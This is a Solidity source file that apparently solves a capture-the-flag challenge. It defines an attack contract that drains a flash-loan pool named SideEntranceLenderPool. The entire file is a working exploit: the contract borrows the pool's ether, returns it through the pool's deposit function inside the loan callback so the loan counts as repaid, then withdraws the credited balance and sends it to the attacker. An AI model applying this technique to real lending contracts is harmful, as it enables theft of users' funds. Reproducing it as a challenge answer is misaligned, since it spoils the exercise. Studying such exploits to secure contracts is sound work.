// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract AttackSideEntrance {
    address payable public immutable attacker;
    SideEntranceLenderPool public immutable pool;

    constructor(SideEntranceLenderPool _pool) {
        attacker = payable(msg.sender);
        pool = _pool;
    }

    function attack(uint256 amount) external payable {
        // Get a flash loan of 1000 ether. Pool will call back fallback function.
        pool.flashLoan(amount);

        // Withdraw all funds from pool
        pool.withdraw();

        // Transfer funds to attacker
        SafeTransferLib.safeTransferETH(attacker, address(this).balance);
    }

    fallback() external payable {
        // Use the loan to deposit (and repay) the loan.
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
